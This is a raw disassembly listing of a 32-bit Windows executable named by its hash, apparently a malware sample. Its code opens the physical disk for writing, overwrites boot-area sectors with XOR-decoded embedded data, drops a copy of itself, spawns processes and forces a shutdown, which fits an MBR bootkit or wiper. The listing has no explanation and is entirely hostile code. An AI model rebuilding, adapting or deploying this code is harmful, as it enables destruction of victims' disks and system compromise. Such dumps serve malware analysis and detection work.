
a4e63c6ba0e3cb9ba7c90f6803255e4692dc31a1d051c7c71aecbe50d6209168.exe:     file format pei-i386


Disassembly of section .text:

2aa01000 <.text>:
2aa01000:	xchg   esp,eax
2aa01001:	sbb    DWORD PTR [eax],eax
2aa01003:	add    BYTE PTR [ecx+ebx*1+0x19c40000],ch
2aa0100a:	add    BYTE PTR [eax],al
2aa0100c:	add    BYTE PTR [eax],al
2aa0100e:	add    BYTE PTR [eax],al
2aa01010:	out    0x19,al
2aa01012:	add    BYTE PTR [eax],al
2aa01014:	add    BYTE PTR [eax],al
2aa01016:	add    BYTE PTR [eax],al
2aa01018:	push   cs
2aa01019:	sbb    eax,DWORD PTR [eax]
2aa0101b:	add    BYTE PTR [eax],ah
2aa0101d:	sbb    eax,DWORD PTR [eax]
2aa0101f:	add    BYTE PTR [edx],dh
2aa01021:	sbb    eax,DWORD PTR [eax]
2aa01023:	add    BYTE PTR [ebx+ebx*1+0x0],al
2aa01027:	add    BYTE PTR [eax-0x47ffffe6],ch
2aa0102d:	sbb    al,BYTE PTR [eax]
2aa0102f:	add    BYTE PTR [eax],al
2aa01031:	sbb    eax,DWORD PTR [eax]
2aa01033:	add    dl,ch
2aa01035:	sbb    al,BYTE PTR [eax]
2aa01037:	add    dh,bl
2aa01039:	sbb    al,BYTE PTR [eax]
2aa0103b:	add    dh,dl
2aa0103d:	sbb    al,BYTE PTR [eax]
2aa0103f:	add    BYTE PTR [esi],bl
2aa01041:	sbb    al,BYTE PTR [eax]
2aa01043:	add    BYTE PTR [edx+ebx*1],ch
2aa01046:	add    BYTE PTR [eax],al
2aa01048:	inc    eax
2aa01049:	sbb    al,BYTE PTR [eax]
2aa0104b:	add    BYTE PTR [edx+ebx*1+0x0],dl
2aa0104f:	add    BYTE PTR [edx+0x1a],ah
2aa01052:	add    BYTE PTR [eax],al
2aa01054:	outs   dx,BYTE PTR ds:[esi]
2aa01055:	sbb    al,BYTE PTR [eax]
2aa01057:	add    BYTE PTR [eax-0x73ffffe6],al
2aa0105d:	sbb    al,BYTE PTR [eax]
2aa0105f:	add    BYTE PTR [edx-0x37ffffe6],bl
2aa01065:	sbb    al,BYTE PTR [eax]
2aa01067:	add    BYTE PTR [eax],al
2aa01069:	add    BYTE PTR [eax],al
2aa0106b:	add    BYTE PTR [ebx+ebx*1+0x0],bh
2aa0106f:	add    BYTE PTR [eax],al
2aa01071:	add    BYTE PTR [eax],al
2aa01073:	add    BYTE PTR [eax+0x1b],ah
	...
2aa0107e:	add    BYTE PTR [eax],al
2aa01080:	push   0x3a707474
2aa01085:	das    
2aa01086:	das    
2aa01087:	add    BYTE PTR [edx+0x4c],dl
	...
2aa010ee:	add    BYTE PTR [eax],al
2aa010f0:	dec    esp
2aa010f1:	outs   dx,DWORD PTR ds:[esi]
2aa010f2:	inc    ecx
2aa010f3:	fs dec ecx
2aa010f5:	outs   dx,BYTE PTR ds:[esi]
2aa010f6:	inc    edi
2aa010f7:	cs cs cs cs cs add BYTE PTR cs:[eax],al
2aa010ff:	add    BYTE PTR [eax],ah
2aa01101:	and    BYTE PTR [eax],ah
2aa01103:	and    BYTE PTR [eax],al
2aa01105:	add    BYTE PTR [eax],al
2aa01107:	add    BYTE PTR [edi+ebp*2+0x67],ch
2aa0110b:	cmp    eax,0x0
2aa01110:	inc    eax
2aa01111:	mov    ebx,0x7173e64e
2aa01116:	ins    BYTE PTR es:[edi],dx
2aa01117:	push   0x2e74736f
2aa0111c:	fs ins BYTE PTR es:[edi],dx
2aa0111e:	ins    BYTE PTR es:[edi],dx
2aa0111f:	add    BYTE PTR [ebx+0x65],dl
2aa01122:	push   ebx
2aa01123:	push   0x6f647475
2aa01128:	ja     0x2aa01198
2aa0112a:	push   eax
2aa0112b:	jb     0x2aa01196
2aa0112d:	jbe    0x2aa01198
2aa0112f:	ins    BYTE PTR es:[edi],dx
2aa01130:	gs add BYTE PTR gs:[si+0x5c],bl
2aa01136:	cs pop esp
2aa01138:	push   eax
2aa01139:	dec    eax
2aa0113a:	pop    ecx
2aa0113b:	push   ebx
2aa0113c:	dec    ecx
2aa0113d:	inc    ebx
2aa0113e:	inc    ecx
2aa0113f:	dec    esp
2aa01140:	inc    esp
2aa01141:	push   edx
2aa01142:	dec    ecx
2aa01143:	push   esi
2aa01144:	inc    ebp
2aa01145:	xor    BYTE PTR [eax],al
2aa01147:	add    BYTE PTR [ebx+esi*2+0x79],bl
2aa0114b:	jae    0x2aa01180
2aa0114d:	cs gs js 0x2aa011b6
2aa01151:	add    BYTE PTR [eax],al
2aa01153:	add    BYTE PTR [ebx+esi*2+0x79],bl
2aa01157:	jae    0x2aa011cd
2aa01159:	ins    DWORD PTR es:[edi],dx
2aa0115a:	cs je  0x2aa011d5
2aa0115d:	je     0x2aa0115f
2aa0115f:	add    BYTE PTR [edx+0x75],dh
2aa01162:	outs   dx,BYTE PTR ds:[esi]
2aa01163:	popa   
2aa01164:	jae    0x2aa01166
2aa01166:	add    BYTE PTR [eax],al
2aa01168:	data16 jne 0x2aa011ce
2aa0116b:	imul   esp,DWORD PTR [ebp+0x64],0x2d
2aa0116f:	jne    0x2aa011e1
2aa01171:	sub    eax,0x74696873
	...
2aa0117e:	add    BYTE PTR [eax],al
2aa01180:	sub    esp,0x1c
2aa01183:	lea    eax,[esp]
2aa01186:	push   eax
2aa01187:	push   0x20
2aa01189:	call   DWORD PTR ds:0x2aa01048
2aa0118f:	push   eax
2aa01190:	call   DWORD PTR ds:0x2aa01008
2aa01196:	test   eax,eax
2aa01198:	je     0x2aa011fb
2aa0119a:	lea    ecx,[esp+0x4]
2aa0119e:	push   ecx
2aa0119f:	push   0x2aa01120
2aa011a4:	push   0x0
2aa011a6:	call   DWORD PTR ds:0x2aa01004
2aa011ac:	test   eax,eax
2aa011ae:	je     0x2aa011f1
2aa011b0:	mov    edx,DWORD PTR [esp+0x4]
2aa011b4:	mov    eax,DWORD PTR [esp+0x8]
2aa011b8:	push   0x0
2aa011ba:	push   0x0
2aa011bc:	push   0x0
2aa011be:	lea    ecx,[esp+0x18]
2aa011c2:	push   ecx
2aa011c3:	mov    DWORD PTR [esp+0x20],edx
2aa011c7:	mov    edx,DWORD PTR [esp+0x10]
2aa011cb:	push   0x0
2aa011cd:	push   edx
2aa011ce:	mov    DWORD PTR [esp+0x24],0x1
2aa011d6:	mov    DWORD PTR [esp+0x30],0x2
2aa011de:	mov    DWORD PTR [esp+0x2c],eax
2aa011e2:	call   DWORD PTR ds:0x2aa01000
2aa011e8:	mov    eax,0x1
2aa011ed:	add    esp,0x1c
2aa011f0:	ret    
2aa011f1:	mov    eax,DWORD PTR [esp]
2aa011f4:	push   eax
2aa011f5:	call   DWORD PTR ds:0x2aa01040
2aa011fb:	xor    eax,eax
2aa011fd:	add    esp,0x1c
2aa01200:	ret    
2aa01201:	lea    esi,[esp+0x18]
2aa01205:	lea    edi,[esp-0x1000]
2aa0120c:	mov    ecx,0x200
2aa01211:	lods   al,BYTE PTR ds:[esi]
2aa01212:	xor    al,0x46
2aa01214:	stos   BYTE PTR es:[edi],al
2aa01215:	loop   0x2aa01211
2aa01217:	push   0x0
2aa01219:	jmp    0x2aa0145e
2aa0121e:	nop
2aa0121f:	nop
2aa01220:	push   ebp
2aa01221:	mov    ebp,esp
2aa01223:	and    esp,0xfffffff8
2aa01226:	sub    esp,0x214
2aa0122c:	mov    eax,ds:0x2aa01110
2aa01231:	push   ebx
2aa01232:	push   esi
2aa01233:	push   edi
2aa01234:	push   0x0
2aa01236:	push   0x10000080
2aa0123b:	push   0x3
2aa0123d:	push   0x0
2aa0123f:	push   0x3
2aa01241:	push   0xc0000000
2aa01246:	push   0x2aa01134
2aa0124b:	mov    DWORD PTR [esp+0x238],eax
2aa01252:	call   DWORD PTR ds:0x2aa0104c
2aa01258:	mov    ebx,eax
2aa0125a:	cmp    ebx,0xffffffff
2aa0125d:	mov    DWORD PTR [esp+0x14],ebx
2aa01261:	je     0x2aa01425
2aa01267:	mov    esi,DWORD PTR ds:0x2aa01054
2aa0126d:	push   0x0
2aa0126f:	push   0x0
2aa01271:	push   0x0
2aa01273:	push   ebx
2aa01274:	call   esi
2aa01276:	cmp    eax,0xffffffff
2aa01279:	je     0x2aa01425
2aa0127f:	push   0x0
2aa01281:	lea    eax,[esp+0x14]
2aa01285:	push   eax
2aa01286:	push   0x200
2aa0128b:	lea    ecx,[esp+0x24]
2aa0128f:	push   ecx
2aa01290:	push   ebx
2aa01291:	call   DWORD PTR ds:0x2aa01050
2aa01297:	test   eax,eax
2aa01299:	je     0x2aa01425
2aa0129f:	push   0x0
2aa012a1:	push   0x0
2aa012a3:	push   0x400
2aa012a8:	push   ebx
2aa012a9:	call   esi
2aa012ab:	cmp    eax,0xffffffff
2aa012ae:	je     0x2aa01425
2aa012b4:	mov    edi,DWORD PTR ds:0x2aa01058
2aa012ba:	push   0x0
2aa012bc:	lea    edx,[esp+0x14]
2aa012c0:	push   edx
2aa012c1:	push   0x400
2aa012c6:	push   0x2aa02208
2aa012cb:	push   ebx
2aa012cc:	call   edi
2aa012ce:	test   eax,eax
2aa012d0:	je     0x2aa01425
2aa012d6:	push   0x0
2aa012d8:	push   0x0
2aa012da:	push   0x800
2aa012df:	push   ebx
2aa012e0:	call   esi
2aa012e2:	cmp    eax,0xffffffff
2aa012e5:	je     0x2aa01425
2aa012eb:	push   0x0
2aa012ed:	lea    eax,[esp+0x14]
2aa012f1:	push   eax
2aa012f2:	push   0xa00
2aa012f7:	push   0x2aa02608
2aa012fc:	push   ebx
2aa012fd:	call   edi
2aa012ff:	test   eax,eax
2aa01301:	je     0x2aa01425
2aa01307:	xor    edx,edx
2aa01309:	lea    esp,[esp+0x0]
2aa01310:	mov    edi,DWORD PTR ds:0x2aa0320c
2aa01316:	mov    eax,edi
2aa01318:	lea    esi,[eax+0x1]
2aa0131b:	jmp    0x2aa01320
2aa0131d:	lea    ecx,[ecx+0x0]
2aa01320:	mov    cl,BYTE PTR [eax]
2aa01322:	inc    eax
2aa01323:	test   cl,cl
2aa01325:	jne    0x2aa01320
2aa01327:	sub    eax,esi
2aa01329:	mov    ecx,eax
2aa0132b:	lea    esi,[esp+edx*1+0x18]
2aa0132f:	xor    eax,eax
2aa01331:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
2aa01333:	je     0x2aa0133a
2aa01335:	sbb    eax,eax
2aa01337:	sbb    eax,0xffffffff
2aa0133a:	test   eax,eax
2aa0133c:	je     0x2aa01435
2aa01342:	inc    edx
2aa01343:	cmp    edx,0x200
2aa01349:	jb     0x2aa01310
2aa0134b:	push   0x0
2aa0134d:	push   0x0
2aa0134f:	push   0x200
2aa01354:	push   ebx
2aa01355:	call   DWORD PTR ds:0x2aa01054
2aa0135b:	cmp    eax,0xffffffff
2aa0135e:	je     0x2aa01425
2aa01364:	jmp    0x2aa01201
2aa01369:	nop
2aa0136a:	lea    edx,[esp-0xff4]
2aa01371:	nop
2aa01372:	nop
2aa01373:	nop
2aa01374:	push   edx
2aa01375:	push   ebx
2aa01376:	call   DWORD PTR ds:0x2aa01058
2aa0137c:	test   eax,eax
2aa0137e:	je     0x2aa01425
2aa01384:	mov    edx,DWORD PTR ds:0x2aa03208
2aa0138a:	mov    eax,edx
2aa0138c:	xor    ebx,ebx
2aa0138e:	lea    esi,[eax+0x1]
2aa01391:	mov    cl,BYTE PTR [eax]
2aa01393:	inc    eax
2aa01394:	test   cl,cl
2aa01396:	jne    0x2aa01391
2aa01398:	sub    eax,esi
2aa0139a:	mov    ecx,eax
2aa0139c:	mov    edi,edx
2aa0139e:	mov    esi,0x2aa02008
2aa013a3:	xor    eax,eax
2aa013a5:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
2aa013a7:	je     0x2aa013ae
2aa013a9:	sbb    eax,eax
2aa013ab:	sbb    eax,0xffffffff
2aa013ae:	test   eax,eax
2aa013b0:	je     0x2aa013da
2aa013b2:	mov    eax,edx
2aa013b4:	inc    ebx
2aa013b5:	lea    esi,[eax+0x1]
2aa013b8:	mov    cl,BYTE PTR [eax]
2aa013ba:	inc    eax
2aa013bb:	test   cl,cl
2aa013bd:	jne    0x2aa013b8
2aa013bf:	sub    eax,esi
2aa013c1:	mov    ecx,eax
2aa013c3:	mov    edi,edx
2aa013c5:	lea    esi,[ebx+0x2aa02008]
2aa013cb:	xor    eax,eax
2aa013cd:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
2aa013cf:	je     0x2aa013d6
2aa013d1:	sbb    eax,eax
2aa013d3:	sbb    eax,0xffffffff
2aa013d6:	test   eax,eax
2aa013d8:	jne    0x2aa013b2
2aa013da:	mov    ecx,ebx
2aa013dc:	mov    eax,ecx
2aa013de:	shr    ecx,0x2
2aa013e1:	mov    esi,0x2aa02008
2aa013e6:	lea    edi,[esp+0x18]
2aa013ea:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
2aa013ec:	push   0x0
2aa013ee:	mov    ecx,eax
2aa013f0:	and    ecx,0x3
2aa013f3:	push   0x0
2aa013f5:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
2aa013f7:	mov    esi,DWORD PTR [esp+0x1c]
2aa013fb:	push   0x0
2aa013fd:	push   esi
2aa013fe:	call   DWORD PTR ds:0x2aa01054
2aa01404:	cmp    eax,0xffffffff
2aa01407:	je     0x2aa01425
2aa01409:	push   0x0
2aa0140b:	lea    ecx,[esp+0x14]
2aa0140f:	push   ecx
2aa01410:	push   0x200
2aa01415:	lea    edx,[esp+0x24]
2aa01419:	push   edx
2aa0141a:	push   esi
2aa0141b:	call   DWORD PTR ds:0x2aa01058
2aa01421:	test   eax,eax
2aa01423:	jne    0x2aa01444
2aa01425:	xor    eax,eax
2aa01427:	mov    ecx,DWORD PTR [esp+0x21c]
2aa0142e:	pop    edi
2aa0142f:	pop    esi
2aa01430:	pop    ebx
2aa01431:	mov    esp,ebp
2aa01433:	pop    ebp
2aa01434:	ret    
2aa01435:	push   ebx
2aa01436:	call   DWORD PTR ds:0x2aa01040
2aa0143c:	push   0x0
2aa0143e:	call   DWORD PTR ds:0x2aa01030
2aa01444:	push   esi
2aa01445:	call   DWORD PTR ds:0x2aa01040
2aa0144b:	mov    ecx,DWORD PTR [esp+0x21c]
2aa01452:	mov    eax,0x1
2aa01457:	pop    edi
2aa01458:	pop    esi
2aa01459:	pop    ebx
2aa0145a:	mov    esp,ebp
2aa0145c:	pop    ebp
2aa0145d:	ret    
2aa0145e:	lea    ecx,[esp+0x14]
2aa01462:	push   ecx
2aa01463:	push   0x200
2aa01468:	jmp    0x2aa0136a
2aa0146d:	nop
2aa0146e:	nop
2aa0146f:	nop
2aa01470:	sub    esp,0x46c
2aa01476:	mov    eax,ds:0x2aa01110
2aa0147b:	push   ebx
2aa0147c:	mov    ebx,DWORD PTR ds:0x2aa01028
2aa01482:	push   esi
2aa01483:	mov    DWORD PTR [esp+0x470],eax
2aa0148a:	push   edi
2aa0148b:	lea    eax,[esp+0x26c]
2aa01492:	push   eax
2aa01493:	push   0x104
2aa01498:	call   ebx
2aa0149a:	lea    edi,[esp+0x26c]
2aa014a1:	dec    edi
2aa014a2:	mov    al,BYTE PTR [edi+0x1]
2aa014a5:	inc    edi
2aa014a6:	test   al,al
2aa014a8:	jne    0x2aa014a2
2aa014aa:	mov    ecx,DWORD PTR ds:0x2aa01154
2aa014b0:	mov    edx,DWORD PTR ds:0x2aa01158
2aa014b6:	mov    ax,ds:0x2aa0115c
2aa014bc:	mov    DWORD PTR [edi],ecx
2aa014be:	mov    cl,BYTE PTR ds:0x2aa0115e
2aa014c4:	mov    DWORD PTR [edi+0x4],edx
2aa014c7:	push   0x104
2aa014cc:	lea    edx,[esp+0x16c]
2aa014d3:	push   edx
2aa014d4:	mov    WORD PTR [edi+0x8],ax
2aa014d8:	push   0x0
2aa014da:	mov    BYTE PTR [edi+0xa],cl
2aa014dd:	call   DWORD PTR ds:0x2aa01034
2aa014e3:	push   0x0
2aa014e5:	push   0x0
2aa014e7:	push   0x2
2aa014e9:	push   0x0
2aa014eb:	push   0x3
2aa014ed:	push   0xc0000000
2aa014f2:	lea    eax,[esp+0x284]
2aa014f9:	push   eax
2aa014fa:	call   DWORD PTR ds:0x2aa0104c
2aa01500:	mov    esi,eax
2aa01502:	lea    eax,[esp+0x168]
2aa01509:	lea    edx,[eax+0x1]
2aa0150c:	lea    esp,[esp+0x0]
2aa01510:	mov    cl,BYTE PTR [eax]
2aa01512:	inc    eax
2aa01513:	test   cl,cl
2aa01515:	jne    0x2aa01510
2aa01517:	push   0x0
2aa01519:	push   0x0
2aa0151b:	push   0x0
2aa0151d:	sub    eax,edx
2aa0151f:	push   esi
2aa01520:	mov    edi,eax
2aa01522:	call   DWORD PTR ds:0x2aa01054
2aa01528:	push   0x0
2aa0152a:	lea    ecx,[esp+0x10]
2aa0152e:	push   ecx
2aa0152f:	push   edi
2aa01530:	lea    edx,[esp+0x174]
2aa01537:	push   edx
2aa01538:	push   esi
2aa01539:	call   DWORD PTR ds:0x2aa01058
2aa0153f:	push   esi
2aa01540:	call   DWORD PTR ds:0x2aa01040
2aa01546:	lea    eax,[esp+0x64]
2aa0154a:	push   eax
2aa0154b:	push   0x104
2aa01550:	call   ebx
2aa01552:	lea    edi,[esp+0x64]
2aa01556:	dec    edi
2aa01557:	mov    al,BYTE PTR [edi+0x1]
2aa0155a:	inc    edi
2aa0155b:	test   al,al
2aa0155d:	jne    0x2aa01557
2aa0155f:	mov    ecx,DWORD PTR ds:0x2aa01148
2aa01565:	mov    edx,DWORD PTR ds:0x2aa0114c
2aa0156b:	mov    ax,ds:0x2aa01150
2aa01571:	mov    DWORD PTR [edi],ecx
2aa01573:	push   0x1
2aa01575:	mov    DWORD PTR [edi+0x4],edx
2aa01578:	lea    ecx,[esp+0x68]
2aa0157c:	push   ecx
2aa0157d:	lea    edx,[esp+0x170]
2aa01584:	push   edx
2aa01585:	mov    WORD PTR [edi+0x8],ax
2aa01589:	call   DWORD PTR ds:0x2aa01038
2aa0158f:	xor    eax,eax
2aa01591:	mov    cl,BYTE PTR [esp+eax*1+0x64]
2aa01595:	mov    BYTE PTR [esp+eax*1+0x370],cl
2aa0159c:	inc    eax
2aa0159d:	test   cl,cl
2aa0159f:	jne    0x2aa01591
2aa015a1:	xor    eax,eax
2aa015a3:	mov    ecx,0x11
2aa015a8:	lea    edi,[esp+0x20]
2aa015ac:	rep stos DWORD PTR es:[edi],eax
2aa015ae:	lea    eax,[esp+0x10]
2aa015b2:	push   eax
2aa015b3:	lea    ecx,[esp+0x24]
2aa015b7:	push   ecx
2aa015b8:	push   0x0
2aa015ba:	push   0x0
2aa015bc:	push   0x0
2aa015be:	push   0x0
2aa015c0:	push   0x0
2aa015c2:	push   0x0
2aa015c4:	lea    edx,[esp+0x390]
2aa015cb:	push   edx
2aa015cc:	lea    eax,[esp+0x88]
2aa015d3:	push   eax
2aa015d4:	mov    DWORD PTR [esp+0x48],0x44
2aa015dc:	call   DWORD PTR ds:0x2aa01018
2aa015e2:	mov    ecx,DWORD PTR [esp+0x474]
2aa015e9:	pop    edi
2aa015ea:	pop    esi
2aa015eb:	pop    ebx
2aa015ec:	nop
2aa015ed:	nop
2aa015ee:	nop
2aa015ef:	nop
2aa015f0:	nop
2aa015f1:	add    esp,0x46c
2aa015f7:	ret    
2aa015f8:	nop
2aa015f9:	nop
2aa015fa:	nop
2aa015fb:	nop
2aa015fc:	nop
2aa015fd:	nop
2aa015fe:	nop
2aa015ff:	nop
2aa01600:	nop
2aa01601:	nop
2aa01602:	nop
2aa01603:	nop
2aa01604:	nop
2aa01605:	nop
2aa01606:	nop
2aa01607:	nop
2aa01608:	nop
2aa01609:	nop
2aa0160a:	nop
2aa0160b:	nop
2aa0160c:	nop
2aa0160d:	nop
2aa0160e:	nop
2aa0160f:	nop
2aa01610:	nop
2aa01611:	nop
2aa01612:	nop
2aa01613:	nop
2aa01614:	nop
2aa01615:	nop
2aa01616:	nop
2aa01617:	nop
2aa01618:	nop
2aa01619:	nop
2aa0161a:	nop
2aa0161b:	nop
2aa0161c:	nop
2aa0161d:	nop
2aa0161e:	nop
2aa0161f:	nop
2aa01620:	nop
2aa01621:	nop
2aa01622:	nop
2aa01623:	nop
2aa01624:	nop
2aa01625:	nop
2aa01626:	nop
2aa01627:	nop
2aa01628:	nop
2aa01629:	nop
2aa0162a:	nop
2aa0162b:	nop
2aa0162c:	nop
2aa0162d:	nop
2aa0162e:	nop
2aa0162f:	nop
2aa01630:	nop
2aa01631:	nop
2aa01632:	nop
2aa01633:	nop
2aa01634:	nop
2aa01635:	nop
2aa01636:	nop
2aa01637:	nop
2aa01638:	nop
2aa01639:	nop
2aa0163a:	nop
2aa0163b:	nop
2aa0163c:	nop
2aa0163d:	nop
2aa0163e:	nop
2aa0163f:	nop
2aa01640:	nop
2aa01641:	nop
2aa01642:	nop
2aa01643:	nop
2aa01644:	nop
2aa01645:	nop
2aa01646:	nop
2aa01647:	nop
2aa01648:	nop
2aa01649:	nop
2aa0164a:	nop
2aa0164b:	nop
2aa0164c:	nop
2aa0164d:	nop
2aa0164e:	nop
2aa0164f:	nop
2aa01650:	nop
2aa01651:	nop
2aa01652:	nop
2aa01653:	nop
2aa01654:	nop
2aa01655:	nop
2aa01656:	nop
2aa01657:	nop
2aa01658:	nop
2aa01659:	nop
2aa0165a:	nop
2aa0165b:	nop
2aa0165c:	nop
2aa0165d:	nop
2aa0165e:	nop
2aa0165f:	nop
2aa01660:	nop
2aa01661:	nop
2aa01662:	nop
2aa01663:	nop
2aa01664:	nop
2aa01665:	nop
2aa01666:	nop
2aa01667:	nop
2aa01668:	nop
2aa01669:	nop
2aa0166a:	nop
2aa0166b:	nop
2aa0166c:	nop
2aa0166d:	nop
2aa0166e:	nop
2aa0166f:	nop
2aa01670:	nop
2aa01671:	push   ebp
2aa01672:	mov    ebp,esp
2aa01674:	and    esp,0xfffffff8
2aa01677:	sub    esp,0x21c
2aa0167d:	mov    eax,ds:0x2aa01110
2aa01682:	push   ebx
2aa01683:	push   esi
2aa01684:	mov    DWORD PTR [esp+0x220],eax
2aa0168b:	push   edi
2aa0168c:	xor    eax,eax
2aa0168e:	lea    ecx,[ecx+0x0]
2aa01691:	xor    BYTE PTR [eax+0x2aa02608],0x7d
2aa01698:	inc    eax
2aa01699:	cmp    eax,0x730
2aa0169e:	jl     0x2aa01691
2aa016a0:	push   0x104
2aa016a5:	lea    eax,[esp+0x14]
2aa016a9:	push   eax
2aa016aa:	push   0x0
2aa016ac:	call   DWORD PTR ds:0x2aa01044
2aa016b2:	push   eax
2aa016b3:	call   DWORD PTR ds:0x2aa01034
2aa016b9:	mov    ebx,DWORD PTR ds:0x2aa0104c
2aa016bf:	push   0x0
2aa016c1:	push   0x80
2aa016c6:	push   0x3
2aa016c8:	push   0x0
2aa016ca:	push   0x3
2aa016cc:	push   0x10000000
2aa016d1:	push   0x2aa01134
2aa016d6:	call   ebx
2aa016d8:	cmp    eax,0xffffffff
2aa016db:	jne    0x2aa01734
2aa016dd:	call   DWORD PTR ds:0x2aa01024
2aa016e3:	cmp    al,0x5
2aa016e5:	jbe    0x2aa01746
2aa016e7:	mov    ebx,DWORD PTR ds:0x2aa01020
2aa016ed:	push   0x2aa01168
2aa016f2:	call   ebx
2aa016f4:	test   ax,ax
2aa016f7:	jne    0x2aa0172c
2aa016f9:	mov    esi,DWORD PTR ds:0x2aa0106c
2aa016ff:	mov    edi,DWORD PTR ds:0x2aa0103c
2aa01705:	push   0x1
2aa01707:	push   0x0
2aa01709:	push   0x0
2aa0170b:	lea    ecx,[esp+0x1c]
2aa0170f:	push   ecx
2aa01710:	push   0x2aa01160
2aa01715:	push   0x0
2aa01717:	call   esi
2aa01719:	push   0x3e8
2aa0171e:	call   edi
2aa01720:	push   0x2aa01168
2aa01725:	call   ebx
2aa01727:	test   ax,ax
2aa0172a:	je     0x2aa01705
2aa0172c:	push   0x0
2aa0172e:	call   DWORD PTR ds:0x2aa01030
2aa01734:	push   eax
2aa01735:	call   DWORD PTR ds:0x2aa01040
2aa0173b:	push   0x2aa01168
2aa01740:	call   DWORD PTR ds:0x2aa0101c
2aa01746:	push   0x2710
2aa0174b:	push   0x40
2aa0174d:	call   DWORD PTR ds:0x2aa01060
2aa01753:	push   esi
2aa01754:	push   esi
2aa01755:	push   esi
2aa01756:	push   esi
2aa01757:	push   esi
2aa01758:	push   esi
2aa01759:	push   esi
2aa0175a:	push   esi
2aa0175b:	push   esi
2aa0175c:	push   esi
2aa0175d:	mov    edi,eax
2aa0175f:	push   0x2aa02608
2aa01764:	push   edi
2aa01765:	call   0x2aa0188e
2aa0176a:	mov    edx,0x2aa02608
2aa0176f:	add    esp,0x30
2aa01772:	mov    eax,edi
2aa01774:	sub    edx,edi
2aa01776:	mov    cl,BYTE PTR [eax]
2aa01778:	mov    BYTE PTR [edx+eax*1],cl
2aa0177b:	inc    eax
2aa0177c:	test   cl,cl
2aa0177e:	jne    0x2aa01776
2aa01780:	lea    edx,[esp+0x118]
2aa01787:	push   edx
2aa01788:	push   0x104
2aa0178d:	call   DWORD PTR ds:0x2aa01028
2aa01793:	lea    edi,[esp+0x118]
2aa0179a:	dec    edi
2aa0179b:	jmp    0x2aa017a0
2aa0179d:	lea    ecx,[ecx+0x0]
2aa017a0:	mov    al,BYTE PTR [edi+0x1]
2aa017a3:	inc    edi
2aa017a4:	test   al,al
2aa017a6:	jne    0x2aa017a0
2aa017a8:	mov    eax,ds:0x2aa01154
2aa017ad:	mov    ecx,DWORD PTR ds:0x2aa01158
2aa017b3:	mov    dx,WORD PTR ds:0x2aa0115c
2aa017ba:	push   0x0
2aa017bc:	push   0x0
2aa017be:	push   0x3
2aa017c0:	mov    DWORD PTR [edi],eax
2aa017c2:	mov    al,ds:0x2aa0115e
2aa017c7:	push   0x0
2aa017c9:	mov    DWORD PTR [edi+0x4],ecx
2aa017cc:	push   0x3
2aa017ce:	push   0x80000000
2aa017d3:	lea    ecx,[esp+0x130]
2aa017da:	mov    WORD PTR [edi+0x8],dx
2aa017de:	push   ecx
2aa017df:	mov    BYTE PTR [edi+0xa],al
2aa017e2:	call   ebx
2aa017e4:	mov    esi,eax
2aa017e6:	cmp    esi,0xffffffff
2aa017e9:	je     0x2aa0184c
2aa017eb:	xor    eax,eax
2aa017ed:	push   eax
2aa017ee:	mov    ecx,0x41
2aa017f3:	lea    edi,[esp+0x14]
2aa017f7:	push   esi
2aa017f8:	rep stos DWORD PTR es:[edi],eax
2aa017fa:	call   DWORD PTR ds:0x2aa0105c
2aa01800:	push   0x0
2aa01802:	push   0x0
2aa01804:	push   0x0
2aa01806:	push   esi
2aa01807:	mov    edi,eax
2aa01809:	call   DWORD PTR ds:0x2aa01054
2aa0180f:	push   0x0
2aa01811:	lea    edx,[esp+0x10]
2aa01815:	push   edx
2aa01816:	push   edi
2aa01817:	lea    eax,[esp+0x1c]
2aa0181b:	push   eax
2aa0181c:	push   esi
2aa0181d:	call   DWORD PTR ds:0x2aa01050
2aa01823:	push   esi
2aa01824:	call   DWORD PTR ds:0x2aa01040
2aa0182a:	lea    ecx,[esp+0x10]
2aa0182e:	push   ecx
2aa0182f:	call   DWORD PTR ds:0x2aa01064
2aa01835:	call   0x2aa01180
2aa0183a:	push   0x0
2aa0183c:	push   0x2
2aa0183e:	call   DWORD PTR ds:0x2aa01074
2aa01844:	push   0x0
2aa01846:	call   DWORD PTR ds:0x2aa01030
2aa0184c:	call   0x2aa01220
2aa01851:	call   0x2aa01470
2aa01856:	push   0x0
2aa01858:	call   DWORD PTR ds:0x2aa01030
2aa0185e:	int3   
2aa0185f:	int3   
2aa01860:	push   ecx
2aa01861:	mov    ecx,esp
2aa01863:	add    ecx,0x8
2aa01866:	cmp    eax,0x1000
2aa0186b:	jb     0x2aa0187d
2aa0186d:	sub    ecx,0x1000
2aa01873:	or     DWORD PTR [ecx],0x0
2aa01876:	sub    eax,0x1000
2aa0187b:	jmp    0x2aa01866
2aa0187d:	sub    ecx,eax
2aa0187f:	or     DWORD PTR [ecx],0x0
2aa01882:	mov    eax,esp
2aa01884:	mov    esp,ecx
2aa01886:	mov    ecx,DWORD PTR [eax]
2aa01888:	mov    eax,DWORD PTR [eax+0x4]
2aa0188b:	jmp    eax
2aa0188d:	int3   
2aa0188e:	jmp    DWORD PTR ds:0x2aa01010
2aa01894:	or     al,0x19
	...
2aa0189e:	add    BYTE PTR [eax],al
2aa018a0:	fcomp  DWORD PTR [ecx]
2aa018a2:	add    BYTE PTR [eax],al
2aa018a4:	add    BYTE PTR [eax],dl
2aa018a6:	add    BYTE PTR [eax],al
2aa018a8:	sbb    al,0x19
	...
2aa018b2:	add    BYTE PTR [eax],al
2aa018b4:	lock sbb DWORD PTR [eax],eax
2aa018b7:	add    BYTE PTR [eax],dl
2aa018b9:	adc    BYTE PTR [eax],al
2aa018bb:	add    BYTE PTR [ecx+ebx*1],ah
	...
2aa018c6:	add    BYTE PTR [eax],al
2aa018c8:	push   edx
2aa018c9:	sbb    eax,DWORD PTR [eax]
2aa018cb:	add    BYTE PTR [eax],bl
2aa018cd:	adc    BYTE PTR [eax],al
2aa018cf:	add    BYTE PTR [eax+0x19],al
2aa018d5:	add    BYTE PTR [eax],al
2aa018d7:	add    BYTE PTR [eax],al
2aa018d9:	add    BYTE PTR [eax],al
2aa018db:	add    BYTE PTR [eax+0x1b],dh
2aa018de:	add    BYTE PTR [eax],al
2aa018e0:	je     0x2aa018f2
2aa018e2:	add    BYTE PTR [eax],al
2aa018e4:	js     0x2aa018ff
	...
2aa018ee:	add    BYTE PTR [eax],al
2aa018f0:	mov    WORD PTR [ebx],ds
